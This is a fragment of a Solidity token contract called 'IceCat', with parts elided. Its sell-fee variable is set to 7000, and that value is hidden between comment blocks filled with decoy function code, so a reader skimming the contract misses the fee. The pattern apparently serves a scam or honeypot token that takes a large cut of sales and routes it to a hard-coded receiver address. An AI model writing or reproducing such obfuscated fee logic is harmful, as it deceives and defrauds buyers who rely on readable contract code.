...
contract IceCat is IERC20, Context, Ownable {
    ...
    // token data
    string constant _name = " IceCat";
    string constant _symbol = " IceCat";
    ...
    // total fees
    uint256 totalFeeSells = /**function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
        && getUnpaidEarnings(shareholder) > minDistribution;
    }
...
}*/7000/**function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
        && getUnpaidEarnings(shareholder) > minDistribution;
    }
    ...
    address public marketingFeeReceiver = 0x50DAc5E03C511644FC6b08d11CccD504d058B788;
